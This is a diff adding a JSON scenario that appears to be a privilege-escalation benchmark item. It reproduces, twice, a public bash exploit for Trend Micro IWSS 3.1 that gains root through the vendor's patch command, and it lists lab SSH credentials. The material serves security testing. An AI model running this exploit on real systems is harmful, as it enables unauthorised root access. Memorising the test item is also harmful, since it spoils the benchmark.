@@ -1,0 +1,19 @@
+{
+  "scenario_id": "edb_36257",
+  "type": "core",
+  "category": "C1_cron",
+  "attack_technique": "T1053.003",
+  "cwe": "CWE-732",
+  "difficulty": "medium",
+  "steps_expected": 4,
+  "description": "Linux privilege escalation: Trend Micro IWSS 3.1 - Local Privilege Escalation\n\nExploit source code (36257.txt):\n```\nsource: https://www.securityfocus.com/bid/50380/info\n\nTrendmicro IWSS is prone to a local privilege-escalation vulnerability.\n\nLocal attackers can exploit this issue to execute arbitrary code with root privileges and completely compromise the affected computer.\n\nTrendmicro IWSS 3.1 is vulnerable; other versions may also be affected.\n\n#!/bin/bash\n# Copyright 2011 Buguroo Offensive Security - jrvilla.AT.buguroo.com\n\ncd /tmp\necho \"[*] Creating shell file\"\necho -e \"#!/bin/bash\\n/bin/bash\" > PatchExe.sh\necho \"[*] Change permissions\"\nchmod 755 PatchExe.sh\necho \"[*] Got r00t... Its free!\"\n/opt/trend/iwss/data/patch/bin/patchCmd u root\n```",
+  "detailed_description": "Linux privilege escalation: Trend Micro IWSS 3.1 - Local Privilege Escalation\n\nExploit source code (36257.txt):\n```\nsource: https://www.securityfocus.com/bid/50380/info\n\nTrendmicro IWSS is prone to a local privilege-escalation vulnerability.\n\nLocal attackers can exploit this issue to execute arbitrary code with root privileges and completely compromise the affected computer.\n\nTrendmicro IWSS 3.1 is vulnerable; other versions may also be affected.\n\n#!/bin/bash\n# Copyright 2011 Buguroo Offensive Security - jrvilla.AT.buguroo.com\n\ncd /tmp\necho \"[*] Creating shell file\"\necho -e \"#!/bin/bash\\n/bin/bash\" > PatchExe.sh\necho \"[*] Change permissions\"\nchmod 755 PatchExe.sh\necho \"[*] Got r00t... Its free!\"\n/opt/trend/iwss/data/patch/bin/patchCmd u root\n```",
+  "variant_of": null,
+  "ground_truth_exploit": "exploit.sh",
+  "detection_difficulty": "medium",
+  "interaction_mode": "multi_step",
+  "docker_feasibility": "L1",
+  "ssh_user": "lowpriv",
+  "ssh_pass": "password123",
+  "ssh_port": 22
+}
